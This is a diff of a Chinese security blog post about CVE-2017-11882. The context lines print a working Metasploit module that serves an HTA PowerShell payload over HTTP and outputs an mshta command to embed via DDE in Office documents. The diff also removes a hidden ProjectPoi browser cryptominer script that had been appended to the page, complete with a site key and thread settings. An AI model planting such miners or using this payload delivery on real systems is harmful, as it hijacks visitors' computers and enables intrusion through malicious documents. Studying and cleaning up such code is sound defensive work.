@@ -116,7 +116,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2017-11-22</span>
-            <span class="time">22:29:23</span>
+            <span class="time">21:05:59</span>
           </span>
           
         </div>
@@ -132,10 +132,10 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer1" class="aplayer" style="margin-bottom: 20px;"></div>
+          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer2" class="aplayer" style="margin-bottom: 20px;"></div>
 		<script>
 			new APlayer({
-				element: document.getElementById("aplayer1"),
+				element: document.getElementById("aplayer2"),
 				narrow: false,
 				autoplay: true,
 				showlrc: 0,
@@ -178,19 +178,6 @@
 <h2 id="0x03-参考文档"><a href="#0x03-参考文档" class="headerlink" title="0x03 参考文档"></a>0x03 参考文档</h2><p>//bobao.360.cn/learning/detail/4734.html</p>
 <p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="external">https://github.com/Ridter/CVE-2017-11882</a></p>
 <p><code>PS_shell.rb</code> 内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">##</div><div class="line"># This module requires Metasploit: https://metasploit.com/download</div><div class="line"># Current source: https://github.com/rapid7/metasploit-framework</div><div class="line">##</div><div class="line"></div><div class="line"></div><div class="line">class MetasploitModule  &lt; Msf::Exploit::Remote</div><div class="line">  Rank = NormalRanking</div><div class="line"></div><div class="line">  include Msf::Exploit::Remote::HttpServer</div><div class="line"></div><div class="line">  def initialize(info  = &#123;&#125;)</div><div class="line">    super(update_info(info,</div><div class="line">      &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;,</div><div class="line">      &apos;Description&apos; =&gt; %q&#123;</div><div class="line">        This module generates an command to place within</div><div class="line">        a word document, that when executed, will retrieve a HTA payload</div><div class="line">        via HTTP from an web server. Currently have not figured out how</div><div class="line">        to generate a doc.</div><div class="line">      &#125;,</div><div class="line">      &apos;License&apos; =&gt; MSF_LICENSE,</div><div class="line">      &apos;Arch&apos; =&gt; ARCH_X86,</div><div class="line">      &apos;Platform&apos; =&gt; &apos;win&apos;,</div><div class="line">      &apos;Targets&apos; =&gt;</div><div class="line">        [</div><div class="line">          [&apos;Automatic&apos;, &#123;&#125; ],</div><div class="line">        ],</div><div class="line">      &apos;DefaultTarget&apos; =&gt; 0,</div><div class="line">    ))</div><div class="line">  end</div><div class="line"></div><div class="line">  def on_request_uri(cli, _request)</div><div class="line">    print_status(&quot;Delivering payload&quot;)</div><div class="line">    p = regenerate_payload(cli)</div><div class="line">    data = Msf::Util::EXE.to_executable_fmt(</div><div class="line">      framework,</div><div class="line">      ARCH_X86,</div><div class="line">      &apos;win&apos;,</div><div class="line">      p.encoded,</div><div class="line">      &apos;hta-psh&apos;,</div><div class="line">      &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125;</div><div class="line">    )</div><div class="line">    send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;)</div><div class="line">  end</div><div class="line"></div><div class="line"></div><div class="line">  def primer</div><div class="line">    url = get_uri</div><div class="line">    print_status(&quot;Place the following DDE in an MS document:&quot;)</div><div class="line">    print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;)</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure></p>
-
-<html>
-<head>
-<script>
-var script = document.createElement("script");
-script.type = "text/javascript";
-script.src = "https://ppoi.org/lib/projectpoi.min.js";
-script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
-document.getElementsByTagName("head")[0].appendChild(script);
-</script>
-</head>
-</html>
-
 
         </div>
       </div>
